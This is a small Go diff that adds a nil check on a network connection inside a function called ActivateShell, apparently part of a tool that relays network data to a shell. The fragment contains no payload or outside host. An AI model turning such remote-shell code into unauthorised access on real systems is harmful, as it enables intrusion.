@@ -49,6 +49,9 @@ func ActivateShell() {
 			if isShellExit {
 				return
 			}
+			if conn == nil {
+				continue
+			}
 			data := make([]byte, BufSize)
 			_, err = conn.Read(data)
 			if err != nil {
